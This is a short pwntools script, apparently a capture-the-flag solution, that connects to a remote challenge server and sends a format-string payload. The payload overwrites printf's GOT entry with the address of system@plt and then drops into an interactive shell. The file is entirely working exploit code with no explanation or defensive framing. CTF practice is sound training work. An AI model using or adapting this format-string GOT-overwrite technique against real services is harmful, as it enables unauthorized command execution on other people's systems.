#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 22003)
# r = process('./binary_300')

system_plt = 0x8048410
printf_got = 0x804a00c

fmt = p32(printf_got + 2) + p32(printf_got)
fmt += '%{}c%7$hn'.format(0x0804 - 8)
fmt += '%{}c%8$hn'.format(0x8410 - 0x0804)

r.sendline(fmt)

r.interactive()
